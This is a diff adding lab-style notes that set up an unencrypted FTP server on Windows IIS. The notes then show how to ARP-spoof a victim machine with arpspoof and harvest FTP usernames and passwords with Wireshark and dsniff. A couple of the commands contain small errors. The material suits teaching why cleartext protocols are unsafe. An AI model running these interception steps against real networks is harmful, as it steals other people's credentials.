@@ -23,8 +23,45 @@
  
  TYPE; exploit
  
+***********CREATING A FTP SERVER *************
+
  
+ 1.Go to the Start menu,
+ then click Control Panel on the right side.
+ 2.Click Programs & Features when Control Panel items window opens up
+ 3.When the Programs & Features window open, click Turn Windows features on or off on the Left sidebar menu.
+ 4.Scroll down to the Internet Information Services section and click the “+” sign to expand it.
+ 5.Then Expand the FTP Server section by clicking the “+” sign to expand it.
+ 6.Now click the FTP Service check box, and then click OK.7
+ .Wait for the FTP Service to install and finish.
+ 8.Open IIS Management Console and Expand your Server
  
- 
- 
- 
+ 9.Expand the folder that says “Sites”
+ 10.At this point, you'll want to Right-Click on the Sites folder and click the Add FTP Site... option.
+ 11.The Wizard window will now open and you will enter in a name for your Site where it says FTP Site Name
+ 12.After you've entered a Name, make sure to enter a path to where you want to host your files, or you can leave the default path.
+ 13.Leave the IP Address: field to “All Unassigned” and the Port at 21.
+ 14.Start FTP Site automatically and select no SSL.
+15 Now, you need to give permission.
+ 16.Your FTP server is created.Accessing FTP server from command prompt:
+ 17.Click Start, and then click Run.
+ 18.A command prompt will appear in a new window.
+ 19.Type ftp microsoft.com and press Enter.
+ 20.If the initial connection is successful, you should be prompted for a username. Type it in and press Enter again.
+ 21.You should now be prompted for a password. Type it in and press Enter once more. 
+ 22.If all is well, then you should now be connected to the remote FTP site.
+23.Type dir and then press Enter to see a list of files and folders.
+24.To quit your FTP session, type quit and press Enter.
+
+An mitm and username and password of FTP transaction using wireshark and dsniff:
+1.To install dsniff, type apt install dsniff in your terminal.
+2.Then, type echo 1 > /proc/sys/net/ipv4/ip_forward and press enter.
+3.Type sysctl –w net.ipv4.ip_forward=1 and press enter.
+4.The main command is arpspoof -i eth0 192.168.68.1 -r 192.168.68.5
+5.Packets will began collecting from the victim machine.
+6.Then you need to install wiresharkin your attacker machine.
+7.In wireshark, collection of packets will be shown. We can filter those packets and select the packet type FTP and there we will get the username and password.
+
+8.By using command, dsniff -I eth0 we can get username and password.
+
+.Hence, this attack is known as MAN-IN-THE-MIDDLE Attack.
